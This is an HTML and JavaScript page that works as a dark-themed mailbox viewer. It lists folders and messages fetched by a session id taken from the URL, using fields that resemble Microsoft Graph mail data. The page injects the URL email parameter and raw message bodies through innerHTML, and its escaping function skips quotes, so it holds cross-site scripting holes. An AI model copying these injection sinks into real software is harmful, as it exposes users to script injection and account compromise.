<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mailbox Viewer</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #1e1e2e; color: #e0e0e0; margin: 0; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { background: #111827; padding: 16px; border-radius: 8px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
        .email-list { background: #111827; border-radius: 8px; overflow: hidden; }
        .email-item { padding: 12px 16px; border-bottom: 1px solid #2d3748; cursor: pointer; display: flex; gap: 12px; }
        .email-item:hover { background: #1a1f3e; }
        .email-item.unread { background: #1e293b; border-left: 3px solid #3b82f6; }
        .email-subject { font-weight: 600; }
        .email-from { font-size: 12px; color: #9ca3af; }
        .email-preview { font-size: 11px; color: #6b7280; margin-top: 4px; }
        .email-date { font-size: 11px; color: #4b5563; margin-left: auto; white-space: nowrap; }
        .loading { text-align: center; padding: 40px; }
        .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid #374151; border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .folder-bar { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
        .folder-btn { background: #1f2937; border: none; padding: 8px 16px; border-radius: 6px; color: white; cursor: pointer; }
        .folder-btn.active { background: #3b82f6; }
        .email-content { background: #111827; border-radius: 8px; padding: 20px; margin-top: 20px; }
        pre { white-space: pre-wrap; word-break: break-all; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h3>📧 Mailbox: <span id="userEmail">Loading...</span></h3>
        <button onclick="location.reload()" style="background:#3b82f6; border:none; padding:6px 12px; border-radius:6px; color:white; cursor:pointer;">Refresh</button>
    </div>
    
    <div class="folder-bar">
        <button class="folder-btn active" onclick="loadFolder('inbox')">Inbox</button>
        <button class="folder-btn" onclick="loadFolder('sent')">Sent</button>
        <button class="folder-btn" onclick="loadFolder('drafts')">Drafts</button>
        <button class="folder-btn" onclick="loadFolder('deleted')">Deleted</button>
    </div>
    
    <div id="emailList" class="email-list">
        <div class="loading"><div class="spinner"></div> Loading emails...</div>
    </div>
    
    <div id="emailContent" class="email-content" style="display:none;"></div>
</div>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    const sid = urlParams.get('sid');
    const userEmail = decodeURIComponent(urlParams.get('email') || '');
    const API_BASE = window.location.origin;
    
    let currentFolder = 'inbox';
    document.getElementById('userEmail').innerHTML = userEmail;
    
    async function loadFolder(folder) {
        currentFolder = folder;
        document.querySelectorAll('.folder-btn').forEach(btn => btn.classList.remove('active'));
        event.target.classList.add('active');
        
        document.getElementById('emailList').innerHTML = '<div class="loading"><div class="spinner"></div> Loading emails...</div>';
        document.getElementById('emailContent').style.display = 'none';
        
        try {
            const response = await fetch(`${API_BASE}/api/mail/${sid}/${folder}`);
            const data = await response.json();
            
            if (data.value && data.value.length > 0) {
                renderEmailList(data.value);
            } else {
                document.getElementById('emailList').innerHTML = '<div class="loading">📭 No emails in this folder</div>';
            }
        } catch (err) {
            document.getElementById('emailList').innerHTML = '<div class="loading">❌ Failed to load emails</div>';
        }
    }
    
    function renderEmailList(emails) {
        const container = document.getElementById('emailList');
        container.innerHTML = emails.map(email => `
            <div class="email-item ${!email.isRead ? 'unread' : ''}" onclick="viewEmail('${email.id}')">
                <div style="flex:1">
                    <div class="email-subject">${escapeHtml(email.subject || '(No subject)')}${email.hasAttachments ? ' 📎' : ''}</div>
                    <div class="email-from">${escapeHtml(email.from?.emailAddress?.name || email.from?.emailAddress?.address)}</div>
                    <div class="email-preview">${escapeHtml(email.bodyPreview || '')}</div>
                </div>
                <div class="email-date">${formatDate(email.receivedDateTime)}</div>
            </div>
        `).join('');
    }
    
    async function viewEmail(messageId) {
        document.getElementById('emailContent').style.display = 'block';
        document.getElementById('emailContent').innerHTML = '<div class="loading"><div class="spinner"></div> Loading message...</div>';
        
        try {
            const response = await fetch(`${API_BASE}/api/mail/message/${sid}/${messageId}`);
            const email = await response.json();
            
            document.getElementById('emailContent').innerHTML = `
                <h3>${escapeHtml(email.subject || '(No subject)')}</h3>
                <div style="margin: 12px 0; padding: 12px 0; border-bottom: 1px solid #2d3748;">
                    <div><strong>From:</strong> ${escapeHtml(email.from?.emailAddress?.name || email.from?.emailAddress?.address)}</div>
                    <div><strong>To:</strong> ${escapeHtml(email.toRecipients?.map(r => r.emailAddress.address).join(', '))}</div>
                    <div><strong>Date:</strong> ${new Date(email.receivedDateTime).toLocaleString()}</div>
                </div>
                <div>${email.body?.content || email.bodyPreview || 'No content'}</div>
                <button onclick="document.getElementById('emailContent').style.display='none'" style="margin-top:16px; background:#3b82f6; border:none; padding:6px 12px; border-radius:6px; color:white; cursor:pointer;">Close</button>
            `;
        } catch (err) {
            document.getElementById('emailContent').innerHTML = '<div class="loading">❌ Failed to load message</div>';
        }
    }
    
    function escapeHtml(str) { if (!str) return ''; return str.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]); }
    function formatDate(d) { return d ? new Date(d).toLocaleDateString() : 'Unknown'; }
    
    loadFolder('inbox');
</script>
</body>
</html>
